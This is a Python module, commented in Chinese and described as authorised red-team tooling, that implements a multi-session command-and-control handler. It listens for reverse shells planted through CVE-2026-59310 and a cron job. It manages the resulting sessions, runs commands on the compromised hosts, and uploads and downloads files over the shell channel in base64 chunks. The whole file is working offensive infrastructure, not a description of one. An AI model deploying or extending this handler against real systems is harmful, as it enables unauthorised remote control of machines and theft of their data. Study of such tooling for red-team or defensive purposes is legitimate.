"""多会话 C2（授权红队用途）：反弹 shell 监听、会话管理、交互与文件传输。

定位说明：这是一个"会话管理器/命令分发台"（类似 metasploit multi/handler
+ sessions），不是隐蔽植入体框架 —— 不实现 beacon 心跳、开机持久化、
流量伪装与免杀。植入端即标准 bash/python 反弹 shell（由 CVE-2026-59310
的 cron 触发），断线不自动重连；重连 = 重新植入（见 plant_revshell）。

IO 模型（与原始 POC 的裸 shell 循环行为一致）：
    每个会话一个持续读取线程，输出以原始流方式实时进入 Session.buffer
    （仅剥离 ANSI 转义序列、归一化换行），交互端随时取用 —— 不做
    "切块等待"。命令发送后不做本地回显（远端 PTY 会回显）。

用法（CLI）：
    python -m vcstrike listen --ports 4444,8443
    python -m vcstrike revshell <host> --lhost <ip> --lport 4444

REPL 命令（均带会话 id）：help / sessions / listeners / use <id> / back /
    close <id> / exec <id> <cmd> / upload <id> <local> <remote> /
    download <id> <remote> <local> / exit
    会话直通模式下其他输入转发 shell；exit 返回 c2>，顶层 exit 退出控制台。
    命令名是保留字：要在目标上执行同名命令请用 exec <id> <cmd>。
"""
import base64
import hashlib
import os
import re
import shlex
import socket
import threading
import time

from . import logutil

# ANSI 转义序列：CSI（颜色/光标）、OSC（窗口标题等）、键盘模式/复位
ANSI_RE = re.compile(
    r"\x1b\[[0-9;?]*[A-Za-z]"
    r"|\x1b\][^\x07\x1b]*(?:\x07|\x1b\\)?"
    r"|\x1b[=>#c]")


def strip_ansi(text):
    """剥离 ANSI 转义并归一化换行（\r\n / \r → \n）。"""
    text = ANSI_RE.sub("", text)
    return text.replace("\r\n", "\n").replace("\r", "\n")


class Session:
    _next_id = 1
    _next_lock = threading.Lock()

    def __init__(self, conn, addr, on_log=lambda s: None):
        with Session._next_lock:
            self.id = Session._next_id
            Session._next_id += 1
        self.conn = conn
        self.addr = "%s:%d" % addr
        self.created = time.strftime("%H:%M:%S")
        self.last_seen = time.time()
        self.alive = True
        self._log = on_log
        self._send_lock = threading.Lock()
        self._buf_lock = threading.Lock()
        self._consume_lock = threading.Lock()   # 串行化"等待+消费"型操作
        self.feed_paused = False                # GUI 实时流暂停（传输/收集期间）
        self.buffer = ""                        # 累积输出（已剥离 ANSI）
        self._pos = 0                           # 消费游标
        self.name = ""
        self.conn.settimeout(0.3)
        threading.Thread(target=self._reader, daemon=True).start()

    def _reader(self):
        """持续读取线程：输出以原始流实时进入 buffer（等价 nc 行为）。"""
        while self.alive:
            try:
                d = self.conn.recv(65536)
            except socket.timeout:
                continue
            except OSError:
                break
            if not d:
                break
            text = strip_ansi(d.decode("utf-8", "replace"))
            with self._buf_lock:
                self.buffer += text
                self.last_seen = time.time()
            logutil.raw("[会话#%d 输出] %s" % (self.id, text))
        self.alive = False
        self._log("[i] 会话 #%d 连接关闭" % self.id)

    def send_line(self, cmd):
        with self._send_lock:
            self.conn.sendall(cmd.encode() + b"\n")
            self.last_seen = time.time()

    # ---- 输出消费 ----
    def output_len(self):
        with self._buf_lock:
            return len(self.buffer)

    def pending_output(self):
        with self._buf_lock:
            return self.buffer[self._pos:]

    def take_output(self):
        """取走自上次消费以来的全部输出（实时流消费口）。"""
        with self._buf_lock:
            out = self.buffer[self._pos:]
            self._pos = len(self.buffer)
            return out

    def wait_new_output(self, baseline, quiet=0.8, maxwait=10):
        """阻塞等待 buffer 相对 baseline 出现新内容并静默 quiet 秒。

        无输出的命令（cd 等）会在 quiet 秒后快速返回 False，不会等满 maxwait。
        """
        deadline = time.time() + maxwait
        last_size = self.output_len()
        last_change = time.time()
        while time.time() < deadline:
            size = self.output_len()
            if size != last_size:
                last_size = size
                last_change = time.time()
            elif time.time() - last_change >= quiet:
                return size > baseline
            if not self.alive and self.output_len() <= baseline:
                return False
            time.sleep(0.05)
        return self.output_len() > baseline

    def probe(self):
        """存活探测。"""
        try:
            with self._consume_lock:
                base = self.output_len()
                self.send_line("")
                self.wait_new_output(base, quiet=0.5, maxwait=3)
            return self.alive
        except OSError:
            self.alive = False
            return False

    def close(self):
        self.alive = False
        try:
            self.conn.close()
        except Exception:
            pass


class SessionManager:
    """监听器 + 会话注册表。线程安全。"""

    def __init__(self, log=lambda s: None):
        self.sessions = {}
        self._lock = threading.Lock()
        self.listeners = []          # [(port, srv_sock)]
        self._log = log
        self.on_new_session = None   # callback(session) —— GUI 挂钩

    # ---- 监听器 ----
    def add_listener(self, port):
        if any(p == port for p, _ in self.listeners):
            self._log("[i] 端口 %d 已在监听（忽略重复请求）" % port)
            return port
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(8)
        self.listeners.append((port, srv))
        threading.Thread(target=self._accept_loop, args=(port, srv),
                         daemon=True).start()
        self._log("[+] 监听 0.0.0.0:%d（等待回连）" % port)
        return port

    def _accept_loop(self, port, srv):
        srv.settimeout(None)
        while True:
            try:
                conn, addr = srv.accept()
            except OSError:
                return
            sess = Session(conn, addr, on_log=self._log)
            with self._lock:
                self.sessions[sess.id] = sess
            self._log("[+] 新会话 #%d ← %s（端口 %d）" % (sess.id, sess.addr, port))
            self._prune_duplicates(sess)
            if self.on_new_session:
                try:
                    self.on_new_session(sess)
                except Exception:
                    pass

    def _prune_duplicates(self, sess):
        """同一来源 IP 的旧存活会话自动关闭，只保留最新。

        场景：历史版本植入的常驻 cron 每分钟重连，会把会话表刷满；
        收纳为"同源只留最新"后，残留 cron 的重连变成无害噪音。
        """
        ip = sess.addr.rsplit(":", 1)[0]
        with self._lock:
            olds = [s for s in self.sessions.values()
                    if s.id != sess.id and s.alive
                    and s.addr.rsplit(":", 1)[0] == ip]
        for s in olds:
            s.close()
            with self._lock:
                self.sessions.pop(s.id, None)
            self._log("[i] 同源旧会话 #%d（%s）已自动关闭，保留最新 #%d"
                      % (s.id, s.addr, sess.id))

    # ---- 会话操作 ----
    def get(self, sid):
        with self._lock:
            return self.sessions.get(sid)

    def list_sessions(self):
        with self._lock:
            return list(self.sessions.values())

    def exec(self, sid, cmd, timeout=10, quiet=0.8):
        """执行命令并收集输出（消费式；GUI 实时流在传输类操作中自动暂停）。"""
        s = self.get(sid)
        if not s or not s.alive:
            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
        with s._consume_lock:
            base = s.output_len()
            s.send_line(cmd)
            s.wait_new_output(base, quiet=quiet, maxwait=timeout)
            return s.take_output()

    def close(self, sid):
        s = self.get(sid)
        if s:
            s.close()
            with self._lock:
                self.sessions.pop(sid, None)
            self._log("[i] 会话 #%d 已关闭" % sid)

    # ---- 文件传输（经 shell 通道，base64 分块；期间暂停实时流防抢读） ----
    def upload(self, sid, local, remote, chunk=8192, progress=None):
        s = self.get(sid)
        if not s or not s.alive:
            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
        with s._consume_lock:
            s.feed_paused = True
            try:
                with open(local, "rb") as f:
                    data = f.read()
                total = max(1, (len(data) + chunk - 1) // chunk)
                rq = "'%s'" % remote.replace("'", "'\\''")   # 远端路径引号安全
                self._raw(s, "rm -f -- %s" % rq, quiet=0.4)
                for i in range(0, len(data), chunk):
                    b64 = base64.b64encode(data[i:i + chunk]).decode()
                    self._raw(s, "printf %%s %s | base64 -d >> %s" % (b64, rq),
                              quiet=0.4)
                    if progress:
                        progress(i // chunk + 1, total)
                out = self._raw(s, "md5sum %s" % rq, quiet=1.0, maxwait=15)
                local_md5 = hashlib.md5(data).hexdigest()
                m = re.search(r"([0-9a-f]{32})", out)
                if not m or m.group(1) != local_md5:
                    raise RuntimeError(
                        "上传校验失败（远端 md5 不匹配）：%s" % out.strip()[:120])
                return "上传完成，md5 校验一致（%s）" % local_md5
            finally:
                s.feed_paused = False

    def download(self, sid, remote, local, timeout=60):
        s = self.get(sid)
        if not s or not s.alive:
            raise RuntimeError("会话 #%s 不存在或已断开" % sid)
        with s._consume_lock:
            s.feed_paused = True
            try:
                rq = "'%s'" % remote.replace("'", "'\\''")
                out = self._raw(s, "base64 -w0 %s 2>&1" % rq, quiet=2.0,
                                maxwait=timeout)
                lines = [ln.strip() for ln in out.splitlines() if ln.strip()]
                cand = ""
                for ln in reversed(lines):
                    if all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
                           "abcdefghijklmnopqrstuvwxyz0123456789+/=" for c in ln):
                        cand = ln
                        break
                if not cand:
                    raise RuntimeError("未取到有效 base64 输出：%s" % out[:200])
                try:
                    data = base64.b64decode(cand, validate=True)
                except Exception as e:
                    raise RuntimeError(
                        "base64 解码失败（输出可能被截断；大文件请先 gzip 或增大超时）:%s"
                        % e)
                os.makedirs(os.path.dirname(os.path.abspath(local)), exist_ok=True)
                with open(local, "wb") as f:
                    f.write(data)
                return "已保存 %s（%d 字节）" % (local, len(data))
            finally:
                s.feed_paused = False

    def _raw(self, s, cmd, quiet=0.8, maxwait=10):
        """exec 的内部形态：不加锁（调用方已持 consume_lock）。"""
        base = s.output_len()
        s.send_line(cmd)
        s.wait_new_output(base, quiet=quiet, maxwait=maxwait)
        return s.take_output()

    def shutdown(self):
        for _p, srv in self.listeners:
            try:
                srv.close()
            except Exception:
                pass
        for s in self.list_sessions():
            s.close()


HELP_TEXT = """\
可用命令（命令名为保留字；会话内要执行同名 shell 命令请用 exec <id> ...）：
  help                            本帮助
  sessions                        列出会话
  listeners                       查看监听端口
  use <id> / back                 进入/退出会话直通（原始 shell）
  exec <id> <cmd...>              在会话执行命令并收集输出
  upload <id> <local> <remote>    上传（md5 自动校验；路径含空格请加引号）
  download <id> <remote> <local>  下载（base64 校验；大文件建议先 gzip）
  close <id>                      关闭会话
  exit                            会话直通中返回 c2>；顶层退出控制台
说明：会话输出为原始流（ANSI 颜色码已剥离）；长时间无输出的命令会被
      静默判定提前返回；download 单次读回受超时限制，超大文件先压缩。
"""


def interactive_loop(mgr, stdin=None):
    """CLI 交互台。"""
    print(HELP_TEXT)
    cur = None
    while True:
        try:
            prompt = "session#%d> " % cur.id if cur else "c2> "
            line = input(prompt).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not line:
            continue
        parts = line.split()
        cmd = parts[0].lower()
        if cmd in ("exit", "quit"):
            if cur is not None and cmd == "exit":
                cur = None
                print("[i] 返回 c2> 控制台（退出整个控制台请先 back）")
                continue
            break
        elif cmd == "help":
            print(HELP_TEXT)
        elif cmd == "sessions":
            for s in mgr.list_sessions():
                print("  #%d  %-22s 创建 %s  %s" %
                      (s.id, s.addr, s.created, "存活" if s.alive else "已断开"))
        elif cmd == "listeners":
            for p, _ in mgr.listeners:
                print("  :%d" % p)
        elif cmd == "use":
            try:
                s = mgr.get(int(parts[1]))
                if not s:
                    print("[-] 无此会话")
                else:
                    cur = s
            except (IndexError, ValueError):
                print("[-] 用法: use <id>")
        elif cmd == "back":
            cur = None
        elif cmd == "close":
            try:
                mgr.close(int(parts[1]))
            except (IndexError, ValueError):
                print("[-] 用法: close <id>")
        elif cmd == "exec":
            try:
                sid = int(parts[1])
                rest = line.split(None, 2)[2]
            except (IndexError, ValueError):
                print("[-] 用法: exec <id> <cmd>")
                continue
            try:
                print(mgr.exec(sid, rest))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cmd == "upload":
            try:
                sid = int(parts[1])
                toks = shlex.split(line.split(None, 3)[3])
                local, remote = toks[0], toks[1]
            except (IndexError, ValueError):
                print("[-] 用法: upload <id> <local> <remote>（路径含空格加引号）")
                continue
            try:
                mgr.upload(sid, local, remote,
                           progress=lambda i, t: print("  [%.0f%%]" % (i * 100.0 / t)))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cmd == "download":
            try:
                sid = int(parts[1])
                toks = shlex.split(line.split(None, 3)[3])
                remote, local = toks[0], toks[1]
            except (IndexError, ValueError):
                print("[-] 用法: download <id> <remote> <local>（路径含空格加引号）")
                continue
            try:
                print(mgr.download(sid, remote, local))
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
        elif cur is not None:
            # 会话直通模式（顶层保留字已在前面分支处理）
            try:
                out = mgr.exec(cur.id, line)
            except (RuntimeError, OSError) as e:
                print("[-] %s" % e)
                if not cur.alive:
                    print("[!] 会话已断开")
                    cur = None
                continue
            print(out, end="" if out.endswith("\n") else "\n")
            if not cur.alive:
                print("[!] 会话已断开")
                cur = None
        else:
            print("[-] 未知命令（help 查看）")
